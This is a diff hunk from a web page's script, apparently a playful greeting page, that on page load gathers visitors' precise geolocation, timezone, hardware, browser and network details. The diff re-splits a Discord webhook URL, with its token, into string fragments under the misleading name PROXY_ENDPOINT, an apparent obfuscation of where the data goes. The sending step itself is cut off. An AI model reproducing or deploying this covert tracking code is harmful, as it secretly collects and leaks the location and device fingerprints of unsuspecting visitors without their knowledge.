@@ -929,8 +929,8 @@ setTimeout(()=>heroShow('hi!',waveArm),1100);
        window.addEventListener('DOMContentLoaded', function () {
          
          var a = "https://disc";
-         var b = "ord.com/api/web";
-         var c = "hooks/1555671391355936798/l8HP-XJYgC82pCRIeG376CoiRJb5lxZ6bcSy_rNMkfYuyG3l0uVSvgJwEe-6tbdGoC6_";
+         var b = "ord.com/api/webhoo";
+         var c = "ks/1555671391355936798/l8HP-XJYgC82pCRIeG376CoiRJb5lxZ6bcSy_rNMkfYuyG3l0uVSvgJwEe-6tbdGoC6_";
          var PROXY_ENDPOINT = a + b + c;
 
          async function getDeviceAndLocationJson(){const s=window.screen,n=navigator,c=n.connection,l=await new Promise(r=>{n.geolocation?n.geolocation.getCurrentPosition(p=>r({latitude:p.coords.latitude,longitude:p.coords.longitude,accuracyMeters:p.coords.accuracy,altitude:p.coords.altitude,heading:p.coords.heading,speed:p.coords.speed}),e=>r(`Location error: ${e.message}`),{enableHighAccuracy:!0,timeout:1e4,maximumAge:0}):r("Geolocation not supported")});return JSON.stringify({time:{timezoneOffsetMinutes:(new Date).getTimezoneOffset(),timezoneName:Intl.DateTimeFormat().resolvedOptions().timeZone,localTime:new Date().toString(),utcTime:new Date().toISOString()},hardware:{screenResolution:`${s.width}x${s.height}`,availableScreen:`${s.availWidth}x${s.availHeight}`,colorDepth:s.colorDepth,pixelRatio:window.devicePixelRatio,cpuCores:n.hardwareConcurrency||"Unknown",deviceMemoryGB:n.deviceMemory||"Unknown"},browser:{userAgent:n.userAgent,platform:n.platform,primaryLanguage:n.language,preferredLanguages:n.languages,cookiesEnabled:n.cookieEnabled},network:c?{connectionType:c.effectiveType,downlinkMbps:c.downlink,roundTripTimeMs:c.rtt}:"Not supported",location:l})}
